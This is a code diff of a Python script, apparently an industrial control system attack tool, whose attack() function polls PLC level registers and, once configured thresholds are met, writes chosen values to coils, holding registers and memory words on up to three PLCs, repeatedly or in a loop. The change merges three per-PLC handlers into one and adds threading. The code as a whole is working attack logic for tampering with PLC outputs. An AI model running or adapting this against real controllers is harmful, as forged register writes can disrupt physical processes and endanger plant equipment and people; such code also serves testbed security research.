@@ -1,336 +1,161 @@
 #!/usr/bin/env python3
-from functools import partial
 import configparser
+import threading
 
 def attack(ctx):  
 
-    def on_level_change_plc1(value: int):
+    def on_level_change_plc(value: int, address):
 
         # Read from config.ini
         config = configparser.ConfigParser()
         config.read('config.ini')
-        plc = "plc1"
-        address = "0.0.0.0:5023"
-        
+
+        print(address)
+
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
 
         if(pckt_number == "loop"): 
             while(True):
                 case = 0
-                print('PLC 1 level value', value)
-                
-                if checkTrigger():
-                    # Trigger checked
-                    if(config.get('params', 'coil1_sup_limit') != ""):
-                        case += 1
-                    if(config.get('params', 'coil1_inf_limit') !=""):
-                        case += 2
+                print('PLC level value', value)
 
-                    if(case == 0): # No limits
+                sup_lim = ""
+                inf_lim = ""
+                
+                if checkTrigger(address):
+                    # Trigger checked
+                    if(config.get('plc', 'plc1') == address):
+                        sup_lim = config.get('params', 'coil1_sup_limit')
+                        inf_lim = config.get('params', 'coil1_inf_limit')
+                    elif(config.get('plc', 'plc2') == address): 
+                        sup_lim = config.get('params', 'coil2_sup_limit')
+                        inf_lim = config.get('params', 'coil2_inf_limit')
+                    elif(config.get('plc', 'plc3') == address): 
+                        sup_lim = config.get('params', 'coil3_sup_limit')
+                        inf_lim = config.get('params', 'coil3_inf_limit')
+
+                    if(sup_lim == "" and inf_lim == ""): # No limits
                         print("No limits!")   
-                        
-                    elif(case == 1): # Only sup limit
-                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
+                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
+                        sup_lim = int(sup_lim)
+                        if(value >= sup_lim):
+                            trigger_operation_plc(pckt_value, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
-                    elif(case == 2): # Only inf limit
-                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
+                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
+                        inf_lim = int(inf_lim)
+                        if(value <= inf_lim):
+                            trigger_operation_plc(pckt_value, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
-                    elif(case == 3): # Both limits
-                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
+                    else:
+                        sup_lim = int(sup_lim)
+                        inf_lim = int(inf_lim)
+                        if(value <= sup_lim and value >= inf_lim):
+                            trigger_operation_plc(pckt_value, address)
                         else:
                             print("Waiting for triggers...")
-                            if(value > int(config.get('params', 'coil1_sup_limit'))):
+                            if(value > sup_lim):
                                 value -= 1
-                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
+                            elif(value < inf_lim):
                                 value +=1
                       
                 else:
                     # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc, address)
+                            trigger_operation_plc(pckt_value, address)
 
         else:
             # Pckt number != loop
             ct = 0
             n = int(pckt_number)
             while(ct < n):
-                case = 0
-                print('PLC 1 level value', value)
+                print('PLC level value', value)
                 
-                if checkTrigger():
+                if checkTrigger(address):
                     # Trigger checked
-                    if(config.get('params', 'coil1_sup_limit') != ""):
-                        case += 1
-                    if(config.get('params', 'coil1_inf_limit') !=""):
-                        case += 2
+                    if(config.get('plc', 'plc1') == address):
+                        sup_lim = config.get('params', 'coil1_sup_limit')
+                        inf_lim = config.get('params', 'coil1_inf_limit')
+                    elif(config.get('plc', 'plc2') == address): 
+                        sup_lim = config.get('params', 'coil2_sup_limit')
+                        inf_lim = config.get('params', 'coil2_inf_limit')
+                    elif(config.get('plc', 'plc3') == address): 
+                        sup_lim = config.get('params', 'coil3_sup_limit')
+                        inf_lim = config.get('params', 'coil3_inf_limit')
 
-                    if(case == 0): # No limits
+                    if(sup_lim == "" and inf_lim == ""): # No limits
                         print("No limits!")   
-                        
-                    elif(case == 1): # Only sup limit
-                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
+                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
+                        sup_lim = int(sup_lim)
+                        if(value >= sup_lim):
+                            trigger_operation_plc(pckt_value, address)
                         else:
                             print("Waiting for triggers...")
                             value +=1
                         
-                    elif(case == 2): # Only inf limit
-                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
+                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
+                        inf_lim = int(inf_lim)
+                        if(value <= inf_lim):
+                            trigger_operation_plc(pckt_value, address)
                         else:
                             print("Waiting for triggers...")
                             value -=1
                                                             
-                    elif(case == 3): # Both limits
-                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            if(value > int(config.get('params', 'coil1_sup_limit'))):
-                                value -= 1
-                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
-                                value +=1 
-                else:
-                    # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc, address)
-                ct = ct + 1
-                
-    def on_level_change_plc2(value:int):
-
-        # Read from config.ini
-        config = configparser.ConfigParser()
-        config.read('config.ini')
-        plc = "plc2"
-        address = "0.0.0.0:5022"
-        
-        pckt_number = config.get('params', 'packets_number')
-        pckt_value = int(config.get('params', 'packets_value'))
-
-        if(pckt_number == "loop"): 
-            while(True):
-                case = 0
-                print('PLC 2 level value', value)
-                
-                if checkTrigger():
-                    # Trigger checked
-                    if(config.get('params', 'coil2_sup_limit') != ""):
-                        case += 1
-                    if(config.get('params', 'coil2_inf_limit') !=""):
-                        case += 2
-
-                    if(case == 0): # No limits
-                        print("No limits!")   
-                        
-                    elif(case == 1): # Only sup limit
-                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value +=1
-                        
-                    elif(case == 2): # Only inf limit
-                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value -=1
-                                                            
-                    elif(case == 3): # Both limits
-                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            if(value > int(config.get('params', 'coil2_sup_limit'))):
-                                value -= 1
-                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
-                                value +=1
-                    
-                else:
-                    # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc, address)
-
-        else:
-            # Pckt number != loop
-            ct = 0
-            n = int(pckt_number)
-            while(ct < n):
-                case = 0
-                print('PLC 2 level value', value)
-                
-                if checkTrigger():
-                    # Trigger checked
-                    if(config.get('params', 'coil2_sup_limit') != ""):
-                        case += 1
-                    if(config.get('params', 'coil2_inf_limit') !=""):
-                        case += 2
-
-                    if(case == 0): # No limits
-                        print("No limits!")   
-                        
-                    elif(case == 1): # Only sup limit
-                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value +=1
-                        
-                    elif(case == 2): # Only inf limit
-                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            value -=1
-                                                            
-                    elif(case == 3): # Both limits
-                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
-                            trigger_operation_plc(pckt_value, plc, address)
-                        else:
-                            print("Waiting for triggers...")
-                            if(value > int(config.get('params', 'coil2_sup_limit'))):
-                                value -= 1
-                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
-                                value +=1
-                    
-                else:
-                    # Trigger unchecked - only main conditions
-                    trigger_operation_plc(pckt_value, plc, address)
-                ct = ct + 1
-                
-                
-    def on_level_change_plc3(value:int):
-
-            # Read from config.ini
-            config = configparser.ConfigParser()
-            config.read('config.ini')
-            plc = "plc3"
-            address = "0.0.0.0:5021"
-            
-            
-            pckt_number = config.get('params', 'packets_number')
-            pckt_value = int(config.get('params', 'packets_value'))
-
-            if(pckt_number == "loop"): 
-                while(True):
-                    case = 0
-                    print('PLC 3 level value', value)
-                    
-                    if checkTrigger():
-                        # Trigger checked
-                        if(config.get('params', 'coil3_sup_limit') != ""):
-                            case += 1
-                        if(config.get('params', 'coil3_inf_limit') !=""):
-                            case += 2
-
-                        if(case == 0): # No limits
-                            print("No limits!")   
-                            
-                        elif(case == 1): # Only sup limit
-                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
-                                value +=1
-                            
-                        elif(case == 2): # Only inf limit
-                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
-                                value -=1
-                                                                
-                        elif(case == 3): # Both limits
-                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
-                                if(value > int(config.get('params', 'coil3_sup_limit'))):
-                                    value -= 1
-                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
-                                    value +=1
-                        
                     else:
-                        # Trigger unchecked - only main conditions
-                        trigger_operation_plc(pckt_value, plc, address)
-
-            else:
-                # Pckt number != loop
-                ct = 0
-                n = int(pckt_number)
-                while(ct < n):
-                    case = 0
-                    print('PLC 3 level value', value)
-                    
-                    if checkTrigger():
-                        # Trigger checked
-                        if(config.get('params', 'coil3_sup_limit') != ""):
-                            case += 1
-                        if(config.get('params', 'coil3_inf_limit') !=""):
-                            case += 2
-
-                        if(case == 0): # No limits
-                            print("No limits!")   
-                            
-                        elif(case == 1): # Only sup limit
-                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
+                        sup_lim = int(sup_lim)
+                        inf_lim = int(inf_lim)
+                        if(value <= sup_lim and value >= inf_lim):
+                            trigger_operation_plc(pckt_value, address)
+                        else:
+                            print("Waiting for triggers...")
+                            if(value > sup_lim):
+                                value -= 1
+                            elif(value < inf_lim):
                                 value +=1
-                            
-                        elif(case == 2): # Only inf limit
-                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
-                                value -=1
-                                                                
-                        elif(case == 3): # Both limits
-                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
-                                trigger_operation_plc(pckt_value, plc, address)
-                            else:
-                                print("Waiting for triggers...")
-                                if(value > int(config.get('params', 'coil3_sup_limit'))):
-                                    value -= 1
-                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
-                                    value +=1
-                        
-                    else:
-                        # Trigger unchecked - only main conditions
-                        trigger_operation_plc(pckt_value, plc, address)
-                    ct = ct + 1
+                      
+                else:
+                    # Trigger unchecked - only main conditions
+                            trigger_operation_plc(pckt_value, address)
+                ct = ct + 1
     
 
-    def checkTrigger():
+    def checkTrigger(address):
         
         config = configparser.ConfigParser()
         config.read('config.ini')
-        
-        # Allocate trigger params (if present)
-        coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
-        coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
-        coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
-        coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
-        coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
-        coil_3_inf_limit = config.get('params', 'coil3_inf_limit')
 
-        if(coil_1_sup_limit == "" and coil_1_inf_limit == "" and coil_2_sup_limit == "" and coil_2_inf_limit == ""
-            and coil_3_sup_limit =="" and coil_3_inf_limit == ""):
-            return False # No triggers
+        if(address == config.get('plc', 'plc1')):
+            coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
+            coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
+
+            if(coil_1_sup_limit == "" and coil_1_inf_limit == ""):
+                return False
+
+        elif(address == config.get('plc', 'plc2')):
+            coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
+            coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
+
+            if(coil_2_sup_limit == "" and coil_2_inf_limit == ""):
+                return False
+
+        elif(address == config.get('plc', 'plc3')):
+            coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
+            coil_3_inf_limit = config.get('params', 'coil3_inf_limit')
+
+            if(coil_3_sup_limit == "" and coil_3_inf_limit == ""):
+                return False
+        
 
         return True
     
     
     
-    def trigger_operation_plc(p_val, plc, address):
+    def trigger_operation_plc(p_val, address):
         
         config = configparser.ConfigParser()
         config.read('config.ini')
@@ -360,14 +185,17 @@ def attack(ctx):
             if choice.startswith('c'):
                 temp = ctx.register(sett, 'C', int(choice[-1]))
                 temp.write(p_val)
+                print(f"Writing on %QX0.{int(choice[-1])} - {sett}")
             elif choice.startswith('r'):
                 temp = ctx.register(sett, 'H', int(choice[-1]))
                 temp.write(p_val)
+                print(f"Writing on %MX0.{int(choice[-1])} - {sett}")
             elif choice.startswith('m'):
-                temp = ctx.register(sett, 'D', int(choice[-1]))
+                temp = ctx.register(sett, 'H', int(choice[-1])+1024)
                 temp.write(p_val)
+                print(f"Writing on %MW0.{int(choice[-1])} - {sett}")
                 
-            print(f"Writing on %QX0.{int(choice[-1])} - {plc}")
+            
         
         #TODO register write          
         
@@ -399,29 +227,42 @@ def attack(ctx):
         plc_2_input_register = ctx.register('plc2', 'I', 0)
         plc_3_input_register = ctx.register('plc3', 'I', 0)
 
-    print("done")
     # PLC attack
     # ONE PLC selected
-    if config.get('params', 'plc1_choice') != "" or config.get('params', 'plc2_choice') != "" or config.get('params', 'plc3_choice') != "":
+    if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
+        
         print("Attacking one plc...")
-
-        if(config.get('plc', 'plc1') == "0.0.0.0:5023"):
-            plc_1_input_register.start_polling(500, on_level_change_plc1)
-        elif(config.get('plc', 'plc1') == "0.0.0.0:5022"):
-            plc_1_input_register.start_polling(500, on_level_change_plc2)
-        elif(config.get('plc', 'plc1') == "0.0.0.0:5021"):
-            plc_1_input_register.start_polling(500, on_level_change_plc3)
+        plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1')))
         
 
-
-
     # TWO PLCs selected
-    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
+    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
         print("Attacking two plcs...")
+
+        # Threads operations
+        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
+        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))
+
+        thread1.start()
+        thread2.start()
+        thread1.join()
+        thread2.join()
 
     # THREE PLCs selected 
     if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
         print("Attacking three plcs...")
+
+        # Threads operations
+        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
+        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))
+        thread3 = threading.Thread(target=plc_3_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc3'))))
+
+        thread1.start()
+        thread2.start()
+        thread3.start()
+        thread1.join()
+        thread2.join()
+        thread3.join()
 
     
 
